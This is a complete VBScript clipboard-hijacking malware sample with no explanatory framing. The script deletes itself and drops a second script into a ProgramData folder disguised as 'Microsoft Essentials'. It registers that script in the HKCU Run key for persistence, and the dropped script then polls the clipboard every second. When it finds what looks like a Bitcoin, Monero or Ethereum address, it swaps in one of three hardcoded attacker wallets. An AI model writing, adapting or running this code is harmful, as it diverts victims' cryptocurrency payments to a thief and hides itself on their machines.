Dim objWSH,objFSO
Set objWSH = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(wscript.ScriptFullName)
On Error Resume Next
Dim Fygna, Nfbvm, Sctcr, Zvofm, Fobuo, Rlfad
Fygna = "bc1qgmem0e4mjejg4lpp03tzlmhfpj580wv5hhkf3p"
Nfbvm = "467FN8ns2MRYfLVEuyiMUKisvjz7zYaS9PkJVXVCMSwq37NeesHJpkfG44mxEFHu8Nd9VDtcVy4kM9iVD7so87CAH2iteLg"
Sctcr = "0xcB56f3793cA713813f6f4909D7ad2a6EEe41eF5e"
Zvofm = objWSH.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\Microsoft Essentials"
Fobuo = Zvofm & "\Software Essentials.vbs"
Rlfad = "Microsoft Software Essentials"
If Not objFSO.Folderexists(Zvofm) then
objFSO.CreateFolder Zvofm
End If
Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set objRegistry = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")
objRegistry.SetStringValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", Rlfad, chr(34) & Fobuo & chr(34)
Call Lncpp()
objWSH.run chr(34) & Fobuo & chr(34)
Set objWSH = Nothing
Set objFSO = Nothing
Sub Lncpp
    Dim Sdrqq
    Set Sdrqq = objFSO.CreateTextFile(Fobuo, True)
    Sdrqq.WriteLine "On Error Resume Next"
    Sdrqq.WriteLine "Set objHTML = CreateObject(" & chr(34) & "HTMLfile" & chr(34) & ")"
    Sdrqq.WriteLine "Set objWSH = CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")"
    Sdrqq.WriteLine "Do"
    Sdrqq.WriteLine "wscript.sleep(1000)"
    Sdrqq.WriteLine "Twwzb = objHTML.ParentWindow.ClipboardData.GetData(" & chr(34) & "text" & chr(34) & ")"
    Sdrqq.WriteLine "Vsuvu = Len(Twwzb)"   
    Sdrqq.WriteLine "If Left(Twwzb,1) = " & chr(34) & "1" & chr(34) & " then"
    Sdrqq.WriteLine "If Vsuvu >= 26 and Vsuvu <= 35 then"
    Sdrqq.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & Fygna & "| clip" & chr(34) & ", 0"
    Sdrqq.WriteLine "End If"
    Sdrqq.WriteLine "End If"   
    Sdrqq.WriteLine "If Left(Twwzb,1) = " & chr(34) & "3" & chr(34) & " then"
    Sdrqq.WriteLine "If Vsuvu >= 26 and Vsuvu <= 35 then"
    Sdrqq.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & Fygna & "| clip" & chr(34) & ", 0"
    Sdrqq.WriteLine "End If"
    Sdrqq.WriteLine "End If"   
    Sdrqq.WriteLine "If Left(Twwzb,1) = " & chr(34) & "4" & chr(34) & " then"
    Sdrqq.WriteLine "If Vsuvu >= 95 and Vsuvu <= 106 then"
    Sdrqq.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & Nfbvm & "| clip" & chr(34) & ", 0"
    Sdrqq.WriteLine "End If"
    Sdrqq.WriteLine "End If"
    Sdrqq.WriteLine "If Left(Twwzb,1) = " & chr(34) & "p" & chr(34) & " then"
    Sdrqq.WriteLine "If Vsuvu >= 30 and Vsuvu <= 60 then"
    Sdrqq.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & Nfbvm & "| clip" & chr(34) & ", 0"
    Sdrqq.WriteLine "End If"
    Sdrqq.WriteLine "End If"       
    Sdrqq.WriteLine "If Left(Twwzb,1) = " & chr(34) & "0" & chr(34) & " then"
    Sdrqq.WriteLine "If Vsuvu >= 30 and Vsuvu <= 60 then"
    Sdrqq.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & Sctcr & "| clip" & chr(34) & ", 0"
    Sdrqq.WriteLine "End If"
    Sdrqq.WriteLine "End If"   
    Sdrqq.WriteLine "Loop"
    Sdrqq.Close
    Set Sdrqq = Nothing
End Sub
